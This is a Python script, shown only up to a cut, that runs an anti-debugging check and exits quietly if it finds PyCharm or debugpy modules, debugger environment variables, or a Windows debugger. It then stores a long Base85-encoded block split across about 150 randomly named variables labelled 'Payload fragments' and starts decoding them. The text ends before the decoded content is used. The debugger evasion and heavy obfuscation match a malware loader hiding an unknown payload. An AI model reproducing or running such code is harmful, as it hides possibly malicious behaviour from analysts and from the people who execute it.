#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_ceCcbxwJp2R5H6 = 'M78tD4W0`J(j+(c$c8$^d|B{IgWUcn0f*0Ev6a@tc`i2hK3#+Ww`@l9bM#tV2EtppD>mB><E+^#yX~'
_cy66mr9UMWRidV = 'ooU%m<N_S5!V7ARjac>NGfLv>cNr3rE<_~N0pUTk!#t>oQS8mL=3<E(rE88(E0&o0Ve+^nteqh74na'
_ccgYH_sqL1isnO = '{(qlZE4a{We4{AF<ZE?3vPwK{=(a7SmQ4Dl-M5h^;}!$&~V9VP>Nzsqnq~<CK$kk%W548@|^tB3bq&'
_cnNXvexrdhHUhm = 'mMisGthK({_)mA>zPe6K;IvK@_JGlrEq&$2D5CG)FtJ93K2+BROxTRIZcu{BK6y`2jIy;`<olUMRB8'
_cdeZBVlKfThIbU = 'kE;93WgG8KDae4CPUfd>L@%IC4b{1%v7S0=lSdd{F@MFx*jo!fXhbOf^VRhZj#9Heln<QXUqog?;Hj'
_cru5awAapym2fL = '(v^k7Gy&y*r|qQe6g<ALgKo%4Hck=FHQK)EeefSm&V|;Y@?e>Az(VQr4+(G&gX97Gdwwty(%`^s3&V'
_csfhWk4Wr59IC_ = '3cFf0*VSpWvq>-4%*j?>QO+#4?Mi4+CbS@cFU7LtdoS6Qm}L|hjo!M#RF46_oDer#j^Sy@;D7a<N34'
_cbPHMOKi1kKjXy = 'ew*C$chE5y8)Q0mmN|!(7_?PHa-ASedI~O5B+rUN<Q2iPVEJoY3mhVLKVG#l4I+sR<|h+t%|(O6@ob'
_cfF7D_Xcw_rxbm = 'U@Yt}LA^Q(urCM=r?6BHe>jR&lIyc-$gKP6$l`}{)F}TSvcu5*$mg<{oz@1S|1=GXMoasDX48&cIL3'
_cmYmaBD0sp596w = '7o;)UCRpj^ZDvccd_^XBl+pV2D!AZ3+(hid&+YlN6{#t$puF%z*fsc8GQxk#KZNTN)&&5Cwf6UF>3@'
_csnqnrChu9O3a7 = 'n3rCU0`I6Du26V+`(I&s!je{L&GBLUw=H?`7L+pxYc+9hN%J}eAhj7ZLGVFJfR+agmeGcejL((9z5O'
_czEj6elNEWJAPB = 'c*@<MZ##IM|M&3e_JrGX-*drv#HdY9RKwMgTxJHv_q*v<J<ZGP`)Lpyk$c1IC0dRatsIs_XUyN_-i6'
_ckYR_VfpCMqvxU = 'bN}YTC?S#oST&#!os#w6yjnoC#lX<Z_4N{bpdka!#7ESWQhaHgwCPzwt$yhyRM;3G5V&Y2RR#pE(=T'
_ctO3tBe7x_XQuK = 'iY+>Fgg<tipT$~QSk_**Tv^eWrZP5n4itgF@J8DuBw;SQu|J&}nr6cp)rl9W_wq;|msliHQX<7cKCT'
_cuZrG_wKh0pSkC = '^wpl+IQ54hS%lzrHs_R5+sK6mQUd*r~(QzY#+$vEYTZKfYZ@BA(9m<|V9u1E_M#QNl{`iUs}ql)a<B'
_cf7Oyq2Ef7u3hF = 'Y#i?dtRIV06;AGs>OtgklR9A3GcGQ!&DYyHJVB%cIQzYk<rxW|3%<krN?$!_TW;U{(Pf=oPsmHB1hm'
_clqKVDVRJTBfWN = 'o5vPRL3S}3)$ew$^g5uPkbSeple0Ai?hYNmmCxLlOY`INR%1+fkd(44bdxK?I(V;LegzsTf!RlIi8l'
_cmazgLrmGQXqBO = '+E)B6&@g4q5;fNx{#9-z=N-oy!)ZqtrXA}PV5`zL=oDq9(93FeZPz<JiT-fd&#7N<*kMCvRUB?A|2J'
_coB2kT87hrckec = 'irB6<eyA)5tyU`#GK+?<mzw0@y#S&bY()BgiVuI)n00t>;ngmGo;do{AR^jv3Zd31e{mKf#FdC~g4-'
_cuOqe1Fvu3Hkem = '8oN)XctSvG1F7o!<#GEwI%g_Gt)pzYFoosUZfQt&IxW=egvqA=mgqS82dk(b0zaf!{x4#_$-0;JnOj'
_chLIScvNVTspvf = 'x&Ck@9aKl^O|)aGqKoH?C~K$aERk*(;QbDb9?Rv2EV9V_cl4)0SEM=XeDnK%qe(3vc*fg<+e(Yg+7~'
_cguWeumDtwVD54 = '=GTtXpK16@;-cPO&_NV!k7Ay@I?RT?7kLZ&Iu+eKH1Dh6m!{2E~bU}Z|`3E5x5^wD3iQwA^3J{-Gx<'
_cg5zrJs7Qtnu9V = 'CfsC3ZOV*=~yo#V9gffF}^3_9qd=JShulTzb=%#!xfLLqlnV?rPk49<pEjacT_>gG_LOJHx+e<^6M<'
_criW0XaVTZvpGM = 'Bj6l@Bsq;H7OOx>2zkY|K8+f{_CTqEAWszWUO-$U%8-c}q+B0bVt$g=bj{usO+_P`c<Tvnu61}BUVH'
_chS6vWc37S3KHq = '^{P`+<rDi0c0o1Yl0qeRNC{aFZq<-6@2V9AyC-O51#|PzR=NsJSqRgo0`s*woyUdzY}ErO*3^oe=i_'
_ck2Yhj_d6ttSoB = 'h>^c&!bvNqaaR+B5B|tVOf-Hh294rJq^=$O>oBqNl<=IhMT9BFY7<BLnNUq+e(@E|ji#3;0jo-?j)m'
_cs6ohBdJwssf6l = 'jw16F-}SAH@<6BkOWnV%T8N{Jo&nF;GK1(gdQiMLIEUomElNAgHcr3wFXU^fCSiQs}j22~d?fh>rF*'
_cgcMKrlq0aGOJw = 'gXgeJp<lXfy7t?_7~G-q}bDv<*5<;r(oQ})@ScUcU{e7+TP_QfUjy;BHt)WW^a<E!)x+`zATpE$;nW'
_cgqQYtSJFfgddV = '|L~l40d(m^kf+`<KTFDq!^yooIIm~lcl_h3rSnT&9=Dj@qYW-1r%Jf`a)JiPT#UD?5BvbW@*_;?0j0'
_ccl9ae27TkARqr = '2bOX@Tr)N&@3|jjz#*bruM#U$2D$WwO5Hh&>Wkacfsy^$O*3iBJe@W#@4Nl7bsXmq+0N%z0H|qIdW@'
_c_vJKDZlWpsxz7 = 'oo2XUvcLkRsEZH-5r%iZJdBO2rp24sij3DQ4)TJi_fNcR9i*eg+$(_az#7x|tc_n!TNcIwoq5jhT@R'
_cqu9QhDrvfrQTD = '#M8UQR*Bnok_b;OKSw@H$NRl+KrRXWs2{lHO#Nx@-JTQLRC7V}h4pM95G=l5cXy}))iadg6VHXzNOp'
_cnbMZL24xXgMbr = 'B6y&4l*j2KQe`=$@7R+lg50otAN&21aZ<!Mf8!Ik?2d0hSS_?Q+Gw<`#<Crw|#h6iofTsBnYZULgA%'
_cyytskSQdFNRCF = 'lS6=(y-SjInwiD6hj@8~Vli)a*8eJ7PJ@k!h@!mL&qkI{YM&)y+Bhv~{gEun`y>q6weRI$#_9jPF-d'
_ciPFnp0WGJclXC = 'rWuFFZEZAP&VTSc1>(TT!ZS%SGB<X$7QeRabpqk&o1`qUT0Co>DG!H(|w5d(kNZ^}M<F0bIqE(a|h|'
_cu5QXoexkBZQIP = 'LuyOaha2R5w;N%KOnBkfD8dOIe&!x^*|0s?ksiTBT3y*K_Z==6Hq%R*=pbGWOg;*<-~m|k)<j@jU5o'
_c_w64ylHcHWDcz = '6yASc*YzmG13&K*bht4)@p2ZVlCG2bHg-&uD)xn;r?Uf<CZFr7#0V)*AOx1E^oU-DftWPbpcH}+!Nj'
_cyBKO4tDWXE2JH = 'yF0**rE2v2fJD<($1owif%zyI4_$Y+bW=nE?jhM{1W?e6Eo?7u@&x|GNKh(>8xP2l-^IxY<~$78P?^'
_cbTnXmBlzyBHug = '_YEWuNh1tIgMX~pHcmh9$*dPVReV-i#%;kib7x0?Pc%8^el;2h<k*#_oKl7o`y+5B^Si5Ft;F<Yq!C'
_cyjdGvzcSUAtoz = '`|r#QKEWSZ^#d$Ii<W`gvXXZ5g^ATz%%mJ3VRJu{2x($1{zsA2JGgl&fA71VV&GQoXG!7oLHj<iMXD'
_cmHcZm2qgdKmdK = 'B^&qKBxb*172n(jfb7jZ9UzcE$Mh72tGJggtxm^D<Vw8JW8}vxW!VHGjjOkd+|u0%_i&!jr*gM<CoQ'
_cum69_3DHVWlcU = '2FaposlxV?Ww04(TzNN@O<4c>(+X5KEdA;BF!2A)E_F*$Xu<=8hU%xQas#fwcftB!%}K+B05Sk%yls'
_ci7mX8T7G4rQDN = '-1V?!NieQyt~0`?W1#ytl4#M@KIE+XtPtRU#}PHm)Kk9;B)sci>~l#IImn^YLA2)rwW%8Vm*vb3o+P'
_cwkfb7xPZ6DD8c = '{MCK$5@zr#Q(n6jxA_kjzNjOoMR2T-W+t@anIZFimf;!_u)XRim^Nsd;tznD!G}p5OejTta6-=~Z6x'
_cs924as72Uve9S = 'go{c8}Q;(Jl<UNVo5h@@~EwlppN$^B^ILsB+|lo3BQqPjDD`NDfj(HlBdFF{sm$p)ODow7Vm%7LC90'
_c_ycmdStZS50a7 = 'l1cr}(0VRck}|Km*)@dS@KLoUN_I{<#jLEy=Hn1ifI6eonDpmhVpLsD;%0sJl=t&df1?NoOZYLOU84'
_ccDZ26fdjSpQkY = 'rCk@T7@1>=X~?Ndr@HoNY(7oB?jzB1DJ<v!Q5-(>LqGT2=_C8dLIP%(#IIGf5sURt*I;TTF@Y?NkrA'
_ckV_tcTRanLeK9 = '|OnWtZ;WdrB_Y>)EXI_;C(;#A5>f|z7w^DiGo&>MBpt5ir!h>A}=+=Y**9xld~xZMqu_y^3#jKk$ET'
_cn6bq7cd6AS3Y_ = 'Pgim^B-xpPEhFwHokRcg)P+qo#KtXN7#i@d9@S81|AkP0kfr#86O?&NNO=j{RM8r)kJ*#K50gft#a+'
_ccmduFa47FXqxb = 'rV&7x2jCt-=G(<sVR+NuDOnA0_0BHXY_aMY*J-b0qp8ed6UATqNiKcKI!wnoW46&cXb)h0y;>1t^H<'
_cdXQoRxnwZj7wW = '&HG50PWEyhA6&#ZNu@s;Tu2>6YoKNk5bl{m_Api3c)d}K3X2ONY4k7Geil&yJNdIqu!(s5avjn>XIN'
_cjNmAior8vLlYq = 'B}Bt_hjX`GpIb(QXduai_i3h>y%=P6(zgxqP=6ytFlIYq7vxm6e32}TJAI(OtMniPx^6QrWLapqFdw'
_cqJECd1MOorSb9 = '9A3b?jn(P5N|BF7|%8c4Y{8j<2JcB`Ra4Cd;L^V+&24pphDd@h%&`g#Q}}`viU^oa!{tsi`JOZ2s{J'
_cheesPpmft_vo9 = 'EY0`>(TfeMCQX2~5t$>jYk#gt^=1mR2oQu7M{eU3K;MV#z#sU(j%cp#4i^Wz4!qvV%p#s`xcPFMOfs'
_crdXv0vOxOA1dB = '|eha5M@3lidap1-?MYKVnHZB<XTDe+zj9oLuY8ujrw?e&f_BRX#5Oz7Tw0@a%rT^+a^g(?b>*MEycC'
_czM4zshg0JIpXB = 'KsS&|xWoLA%}ITyEr2WDr-CvA=7IA6w+D9s@lOjy!rzkyz*n$g{kffefj23zFacex;lw2^O#JYa09e'
_ccw8nYMrE7Md_D = '~&)!9-!i)64TwlYSG*(A;TN1H=~CLc|U>I_Tbr8Q?o8obplx!Ov0ZwHi<lAmHk+i3I5a#C1Ik+wWtH'
_cxRk43SdBtEDDR = '1B`B#k!Vjn55krZ`rs<Q08T%*R9VMCEuDi%fI7@G#~y?&51Jm@3SPPF-(#rc!Vohq_=cW(gcg1Assu'
_cd5Habq2jBe1OG = 'B?GFhK;%i1<Mwxkf>Rf8A_il8nRQI{<Sa55wx+vy$6L<n)UoQ*jZDYxl)TCTBL)9t+atZW-Du|7YQ~'
_cf152VJfAD77Ob = 'M=o#1QWF=rg4?w39U5AO@N)Rr&6AtTj%l*A6&)_SjpsH1&ZxEs~_<vGVfIgWbU>3Yy?c6U1{plYf_~'
_ckgyPt2xBrVsPw = 'ODxQ>o%56K?!4##AoS;lw2B`B6wj+C$*38_I?Ft*sn|`g2Yj#R26jRy@BAZOaDv1rJoze6v>cMO_73'
_cd1D_TgTLJe_J4 = 'euo)3i&5!g%}JWstlQ-j{$g>R4wJCvb0lkx&_7-osyRq}@|4P3o&q{2W-jsnkDAfRE()VW+w!J4BXS'
_ci64mEjRWHyAHg = 'OsvgNb@_Gp<H}kaH(3&1`dwgGcuExt(@d_)aBJXXdNk*<Zk|j*X6;C@9w!Qce1ptm4sZ9`M&h@;NV9'
_ct2frNUD3XGQN0 = 'rM(r~lb6~+$ogV5%{%F&VhaJu<0?$%6Tp3fXb(j#2x%yK>{WzGn&eIC5&1#iKIr8_OE~0w0&<R6j_L'
_cqN5V7Kpypz5R0 = '8%)I&~W^|Awlo%;%E>RYgJuN|t1!SQRg;zusSM(It(>npAp}#a>{!Zu5_5HfEkB_9a%ef`fHbyB*Ca'
_cbacWLE8Q2YDEp = 'cJhpV>KceRl(;c*hZXYH2$rq~kqjaxN>;q?8zdFg;=$S|`d@ufQH2sQ*5&^wh4cM48)t|5-s7A)Mt5'
_cwkC3eZsXy60Xh = 'B>NcDM`z;lybqgUdS7=mSlxWf>DJ`FyLpBPajU~U7J0v0mNEx*#3mtdfI<+H*~jT=zkEo+jXcW`<5H'
_coDCrbp7EwwCbx = 'oJesV`aseIr`GTcW=W~ILb%WQ)syQuaz&&Ac4;$bJ#MA+eugeYOji-$L1Ve&}$Wz-Q{_U$TOrQEN5J'
_cifihQmbZaOkkr = '!!=JLX-GO^USXyNDOsBkAwhkbu%H;Y!l^X7GgFOIsLY5FL)z7=I%8<rj-?EGnl?!u>5KtI{4?3Gxj!'
_cinVOvtSImLsi8 = 'dh+WmC+W{!Spyb8D;P<W0zpCt$&cbk7xl6or~0w2d>60jQi&ugx|3yqx8hDrb~vdyd}4uwQa$8R5-u'
_clvMTzEH02HxZK = 'ktQKZ*_v6x<@tD!-r)r>Z`4O8_PtDgg$E4kdIV1M(&q<f<G5gi;%?`qN)I;NR8cvn@Ni3I2LOF(^hU'
_cpXx99EvXxa8TD = '%}dagh*k&958gdcpOm^Blp+2O`9Bj5}SP0j4K6s21@gY(}IdV#`a8W7>Tt`eXs-8)*9wl#$jT1&M6D'
_csxQhMDrw9AZb9 = 'PL}7!f|X;c}X!JWgSZ(2ih$<<;>3DqMJeTZdL`4;vZ{Tzn-U-9LvLouM##Se$uk3R)}RggK#C1Q&(Z'
_cpFnI2t3_cBjcv = 'amA95mJdFh0fgcNh<qIKf!HAoP4X}1cK2eh!S_KySdKAhIS(6^nH_l~5m^K4ykXck7QZPjPbB-{}_d'
_cjf5q6FfW9a_Ud = 'TTA!SZL#w{@<;>eWWOaHgDB^Vmk-u=HtuaD%MO6|B%GGm}%xsSXFpueFJ})Zd3EMe6-~OH>=ydPVe+'
_copR0QG1QRwiFm = 'kXWg`<d4j;sM-LMz=&qA7meyrI+R0kfv9&BX6nyP7|3-_z1SCEO+)R{LK<$c_KF1uO1-KpX2cb*OjV'
_cdrcpJSEdVg6Mj = 's<c|GvxtklhF^LZK_$H6*-83}v16x1R}oK|6l15GZ+Bj3<4w1Dz`?4ayG$|-iF9Mfl3ud~nL@|(q7)'
_czPZhUI4R67lUv = 'n`#cjn`c=+kDXMjWr8bgL(%_C<=gVXa~SeX$6Y*&04e9d~^;tYZ&(gq-XFGvzMq%`RHKH|96g}sUs@'
_cnlCl5U5K8yUo2 = 'Rfl-D~vv>8UH`ik~9#9#J$dU+LG93F%FZqipZ=cN)TYnF6=7?xRZQwMwCh{ceMb)v%glc}Dj%2vOy*'
_coQ6I7CkmE_Gqq = 'L$j2L;1x4(FWsiHvA^eQQ4CGYti7rjb#8p#~%!IbZx`tIIiW9{mPS<@XuueGGCU^B2Q&1z}uT^yv@*'
_cooHmE2PtmbivD = '<xPk}KTwYhxp)Z2zfugWIJ=wYplm_wMs~D_w-+XqV1{GqPs^;JOwabzt&a+IEnFq266&r##z1zLJ-Z'
_cnXajWhrBowc6H = 'ViZ7g@GrUTaS;ONItt(}ZX_Af=*ue?Q4d2)aVS)@jtp8D`R{*0%5Az&DzFf->L=P{k<yRZbbG9Efh^'
_cgjLuA9Tib8q6R = 'Fv6&zsj5E<3tw}n({?+=q9s*nQ3BaI=H-~TQJBc1HxWOYpVIYnQif@*RA>JsG%GGxQA<Gft&fY$5UI'
_cj_RpN8snP7WMl = 'h%@p_iL?^Xreiq*`n1i_9bq^vhTv*4D5WqUtm@%lEdvdmOJD`{Kci$7Z2&_f{-K<}`gRCMoQf4?K#?'
_cmfDsCMWrs_FSn = '3f{OOO!~L}{dX!3TOjwu3c~PZ8oPJCDHdQ>uSKq`HaSzYJx>Zf^Nsg6j1)3dYT+vf5M)`@m4H&pW!~'
_cmPQx3hk26K2zG = 'Kn#Q1^+NPAh*+9@8?2dC6~<f+B*UR0#+=w0R33IZg^5lRWEoq|&(?WBac?@xGCv6mnBZ|o*eWJbeel'
_cmz_rXUlWboH4v = '091~Zb}oALCknLyh$&wqwd@Xhxhfld2t+<ehLR(~H?0+z%g*;hXC`0~T%84Fr(1Q<U=9MxFlTDr;+b'
_cfanRw2w11kgxb = 'Tsov9eX!UPKKBA4@a}|i0US!n5wkNcj#O2)R1EC#wQiR58T5kAK+({CH$I{WN-wgS*1WQ&e#Q8egzo'
_ct9wTg2ceK4eTF = '5MB{ghoe=P*RC&jC$_KMkCbX$ie`CMNbpPG0TwJ2W{-J?RhlRruf3|;CZ!;aLq11$c629MiIl!Jz9j'
_c_2Wa5aLk8eUro = 'x#(Dk4+M6Ez_OD58j*=r`PYpH`GI_!Zc;GVdE=i2WcWAtF6)TJ`|lmtKbztes3|XSX*M4br>*nH+&Y'
_cfTHMZpRqpyLUr = '08KJiTGKH@=(B!WHjHNn(JCu5V3wZFS>Z){>P`h@3GqItb;9wE@BwDw?<~LDXkW168gKd-_htNzR%&'
_cxTdCHvoDA6xwk = '(22&Kr$R)Exm+)9c-yz|wMdXLkvpZx)GHbcAQfKp|B$3{jKnV}DHMlsS^_nIgQq-?}SvmrapU}&e1H'
_cly_2OhRxvvHL5 = '~Gk3egUZbQlT0kyqS!^tL7z42D=&NG3vo`bmoNIg9*dkkP=HXUJJc!d8A0QzM_I1+8M50Jj+wJ5Xt~'
_crN9abnPS4updY = 'IHIvMtj=Nitf{JW$6ijwgzZ!*nr_}vH%JxA*W(L#YNdwxPNROj4^jg33<>@JsX~#(p^8UKlPfyl03;'
_ci7eMUUuLij2BA = '`~#n&<SLO?94wn-Dj2f@mAai(fR&{rRLJLRH#fVzSO5fZ(v0vnyWFZT#>M_eVLOR_yO|an&`UMQ_L0'
_cnhVoIZgA7kNQx = 'xmcTKf7kTeF*xx;IvwTEX;6T%HZ6`-el2V<9{=&`29}%N758f(q`NprX9H<#?X_Qb7=Iyi*0$BFFK}'
_caCq9gBXjF1rcP = 'IHj=qRDPju{9p%0IxIK0;x(R?LotH^WF3DlbCQ%efuDU|hGeQwqQkpf1*%smp-h}~)@f3e11y=|<hx'
_cuvmIjRGQRHvWx = '3n0m%VRsRagh8o&nXsQ4EkExnH>!9FW(f}gQv3)IT3Ho+Iy;qKQUHALneIIY|LLk%j>B+o_NGfUn7u'
_csc0pdquYkbemx = '-%0YrEqy-rxHQ7lYrOTc_K%5Qy<LK`jNA0i(+cz~2kF~`j-D>~XWGubQxqYQzcq%UB>VoH<^cOIz&o'
_cwddcO7Nvn5_zW = 'm9_0pKB;#k{<RhYdMR-Segrbq+^4&lbwwu(XBKX%MP2nQIvyFi4)KB2;u3lmh+z#<L8J^~_GqdC3P4'
_csyOLI9iQ1HlH4 = '&^|Sc9+ZBuLb_R^Z^qAU_9I`j!OtVqlH~}$W}*xbqr#bxp`IeSV}5SLlGZ^lZS&e7<3agxN7sEiBdd'
_cc_grLo9R0Ugrz = '{+3DK74RzjDdw%i>aDY{$kiDkSFVH-hrhVIM@4P|#_)2OCkdiVu4Rb;RuGu7I!Wg3!VM&@kH2!7vQ0'
_coE0h1JGGK5jsg = ')<^sbfVMhCgUZQuF!Dno=>y-ha^D{ED`Y%mVt{=r?la!u$rNJm*eWM(~<EMX4_*7$Rv~cg%3%X!$-S'
_ck0P5RriEweT7a = '0_x<9ny~gn}q_C_SxLV?-f{p%b{zd!}pRhyMewF5=q(9}fQzIcmtd@5WvPDqUw@V<u(UOF9Y2B7TQ5'
_cq7iJ1voJC25rf = 'eGPoKp3?pBjH2Otas>*(^EHXv~wY&jw({*p)9T_jGXVYq~=78-YyNT)i?WU%_fDHR0S%dqe&Ekp0^h'
_cpRO_9zNemudZJ = 'EeeHLau!Dq?YBoA&aY2DIy`6o`fQU-VP|0up~}!ed#ke%S|K2qFT0*_S$Vumc66^(B##z_W`uAeS-<'
_cjr5IKQNGmbhKm = 'k=0J%JvXbo!16RyFpG-K7ve=kM<kcA9G$uU!@{K3hfQwkeOzKJzjk```OBX-!=1J*dbzS^^aieu!%J'
_cjGGuar25gGcDG = 'jYu_tN|jic_n9Sf9snOa{vU9(GygeATUA}e%784!DAlRe1Qt+ZK5sg5+-Ij0UW0YQo1hKpc!$CV>}{'
_cqAR5ETVs_qpNz = '*>7Xphx=Jx>D-A2s$<4Z(1kC@5by)R+NVQIF3s>EhZfn@gZzs|3EjVVAfdW5AMqgl36eNTv5KVSb%6'
_cbu5OvB9tpocKf = '_ehxK51R2eImkF<HmSj*Qm^trlW!fs}1)wB&~5NW}!;UOzk)Ux+9=LWryIuBVO<IFe3D;;UTX?`JL('
_cjiuVc0nVHxFqC = 'K4n~k%I2WdpzlXU^MKJ9!7DL!{#lPC_hT^5z7J2wFjZR|jcq#?gn$J6+Z)m4v(f=nq(W6{&NNWouWt'
_cdts5yxI7JKLHB = '|wisOsy>?1mrD#Ve@B417|5l|#&CyF=D{ZGym3WEW(jt3+3r<pzyD0!)#M@Z;-w~m}xx1w7Lz1}<`h'
_cwZd3z3nxcW6RM = '8`TkA@$12OE_P}C5os{Y4~ZkZKYhdemrHpwMYJnKEu<1GF(7kMD*iwoK6d}yUyFOG+A!E)uiF3n56Y'
_cwqht1rBNTZV57 = '5%Hi0%4iW<u1W=QC4U>)aH_pHO3dyr48{!i&U96Juu+Bv<(m>U)3X+nt83%|e&FaWDOzaE4KC;UmJ='
_clXAfFVWbhq0Or = 'FF2s2(A1jaA7j;^I3aor5sDX~lt@h_dx8v%M6)vH(DWxazDV4RRb>Z|$G3oW3m^tmuUCLB`>D^S#dz'
_czy1MmMPcdxPAW = '>*SI;dw&pt!5RRRypN!wicfa3`4bgLqox8WZnS1;+X&WeZ>VbH6QJ=uUvKlm*a{%Y5LOE%30NFg|Eb'
_cfEz2KLr3_XIOG = '?x?)wig+%;TIJiBl?R{f@m%=#s_#WmB6a*_<Z$TLtXAd!efUG=oy32*mL7cDTKks~4*jRv9&Ge?&bm'
_crT0YNgkjffpog = 'S~_5ztMs<mZj`8yMsZD;!#b{AU&Yr7}LhwOn&U5X`e1x)zj^9b-q{sWsER$lQ=y8IH;rL##>n2Y^{~'
_cjLjU6VznGrWBJ = '}sv+dTsYr_sh6{cs)cm=728&fxIO+^0S74oTynW~|@4Q*ZWE$^z6S;&}3AnLG{m7QJa)ic~!%Jkwh<'
_ci7CGPyuTBg_f3 = 't2T>Lo9^TGQ=uoVrVL&dKm=4y9I&J!;A(S71HOT*TKKsA!<jVA8tf6|~H>g_ki4no>#c^J<X>iGm=#'
_cthe1DovMM1h7i = 'd}hH4YX<8A0+PXaT)N{|_TH%hnoLUX^E$XjO>+&?kYA$R=Kx3vK|+V+$+1}Ff`s#9wJXKG6nlf>r!V'
_cvr1jFJUJwR4it = 'WtJxZcZ>EH<Ab`rt(CVRHEHQ9jyngCD(5px#g@;UUHy~s2#!boO*&cHa(lEk#0(Ks7V=vX7tu{dM=y'
_czsIc27ctk5A82 = 'ko&+Vr9lvx^t~#RR$?d7_y1o==)IcF)0BTw5JD$BsiYw9XqbEm#xDqCs{J|9=-E(!i&-WVnABQK5|x'
_cmGZLzRNiicaTm = 'Oo(a=L)9c*+O5gb&U@F3xyqnr^BGfS%nsZeHwk^(vZGxoCOm$q#)P+nqg4dW2N3(3WKuYn@DSKIeJL'
_cz8FK9wAMbWrlK = 'G(r%qqDk{1`M#-MH`f{nUrZaM^sJz%2}_#<mKoVdad$JiN}s#fArs&8x{0$!^ApUF$aRO#M6f^6yIZ'
_cdsfeoe219_WN4 = 't*4jHiy^{6?)JGl7kkf5mcUduKaxQvkgLKv)66M{D=0<2X0-C)!7}BKqkqg8C3owbVlr}-fU>aP5C?'
_cdmP9uSqwAE_Qp = 'jG8S@8&iKcAeHL5(S>?4a=n5&6p3YmIUl(O5uxYf6hz3uP%bP#MX&m*6GVOU2I6VoVB=qExnktUCbn'
_cgLWZEYA2idVlw = '<W=NNb~Ew+u=h{p}WbW;?lpK*O$1VnZNo6A7hiJX;l}sUUeS*p`9Vl!xnX#?N4?JSwmO!QC$=P-|nq'
_cmvm8Kp_uMyVnn = '64cqEaaz_~*ecxq*%ybCh7+|T2Vk`sl^M!Ld!*ZcsP6E3m8SRSzrER9({w@)Zb8^dVlK%=&CN{KLWl'
_crwPK_DlCzBg2M = '5o=W9*kO5)o4h($7swtC56$RS{HczlL2p$S20)eG|3#jq|F-dV}<O6m4Tal8}mu_%#<O#~~T5Q%eUW'
_csHuNNnLpTHfLt = '0aNMSc1ye6q834npp??Il7W_~6qVR27&rL01AH^pR1zu<Ot*bU&fIlPk`BeQpb$!~V{O0q7&P@i5EP'
_cfMmthThnSpKsH = 'Dy;o`GNJrpAD&YQsqFoF{$4`_fb;kqX4TW(yJ!P5ZB=D!eIj$E?jbsr62C%gjMyWN*vd)~HS*U@nA8'
_cjJzPI5WlZnwkM = 'YJ69zyBABlOXGALjM`GSUXD2MmLG(j__ju;@;B`IDGeJCwmR9W@Z^K{5U5DsNKldTkEFgQ_Z|X3N23'
_cfYb_ileslRYdb = '=0kB2o+!M^403HEmHzy^muA0OFO@fy0mx5d>g}&LYO+>555M%`?-QJ1P$b&EUUE6&!bem;&lVkWx>n'
_cs_BoWUcSm_J61 = '`!tDMSun2h;n<ow0?SZkT!=ebHPpGy;i3QSEZ07!vaxPpU%hE6aunY+jfx%u_6G^IUtysf@_Xl#nUp'
_coGbukB4wEff_x = '@!G9IO)bFeB_gobIsYkG3GVVa0^UKZ#(}<EvB^~$7=fqp{mw=(6t^(%$McDtl~A)MX;3SF5#-pedj_'
_cgi_q1DoVt62NU = '~4l6BBC9)X3k>Y*6OE~r9b<lC;Qay91;(i5kVt@gj_ajx8~HcoFuYUe}0OtBf#jh2iS&A;JW>G(_Qr'
_ca_D3pAS08gUo1 = 'qzuo2W>jL9W-q5PcszJ{DA2y-2rhKtxm;zIPm1cH4}WW`BgNxT~Fh|6`9?!FJI|H;*eV!ISuYJ!g!T'
_cnJSvI6e896yj2 = 'T94G1{p4~UMIa)(C`EIt2<E5RLvN#Ii6Dejo!dW>l'

_ppMY8hDzZ8KKS6 = __import__('base64').b85decode(_ceCcbxwJp2R5H6 + _cy66mr9UMWRidV + _ccgYH_sqL1isnO + _cnNXvexrdhHUhm + _cdeZBVlKfThIbU + _cru5awAapym2fL + _csfhWk4Wr59IC_ + _cbPHMOKi1kKjXy + _cfF7D_Xcw_rxbm + _cmYmaBD0sp596w + _csnqnrChu9O3a7 + _czEj6elNEWJAPB + _ckYR_VfpCMqvxU + _ctO3tBe7x_XQuK + _cuZrG_wKh0pSkC + _cf7Oyq2Ef7u3hF + _clqKVDVRJTBfWN + _cmazgLrmGQXqBO + _coB2kT87hrckec + _cuOqe1Fvu3Hkem + _chLIScvNVTspvf + _cguWeumDtwVD54 + _cg5zrJs7Qtnu9V + _criW0XaVTZvpGM + _chS6vWc37S3KHq + _ck2Yhj_d6ttSoB + _cs6ohBdJwssf6l + _cgcMKrlq0aGOJw + _cgqQYtSJFfgddV + _ccl9ae27TkARqr + _c_vJKDZlWpsxz7 + _cqu9QhDrvfrQTD + _cnbMZL24xXgMbr + _cyytskSQdFNRCF + _ciPFnp0WGJclXC + _cu5QXoexkBZQIP + _c_w64ylHcHWDcz + _cyBKO4tDWXE2JH + _cbTnXmBlzyBHug + _cyjdGvzcSUAtoz + _cmHcZm2qgdKmdK + _cum69_3DHVWlcU + _ci7mX8T7G4rQDN + _cwkfb7xPZ6DD8c + _cs924as72Uve9S + _c_ycmdStZS50a7 + _ccDZ26fdjSpQkY + _ckV_tcTRanLeK9 + _cn6bq7cd6AS3Y_ + _ccmduFa47FXqxb + _cdXQoRxnwZj7wW + _cjNmAior8vLlYq + _cqJECd1MOorSb9 + _cheesPpmft_vo9 + _crdXv0vOxOA1dB + _czM4zshg0JIpXB + _ccw8nYMrE7Md_D + _cxRk43SdBtEDDR + _cd5Habq2jBe1OG + _cf152VJfAD77Ob + _ckgyPt2xBrVsPw + _cd1D_TgTLJe_J4 + _ci64mEjRWHyAHg + _ct2frNUD3XGQN0 + _cqN5V7Kpypz5R0 + _cbacWLE8Q2YDEp + _cwkC3eZsXy60Xh + _coDCrbp7EwwCbx + 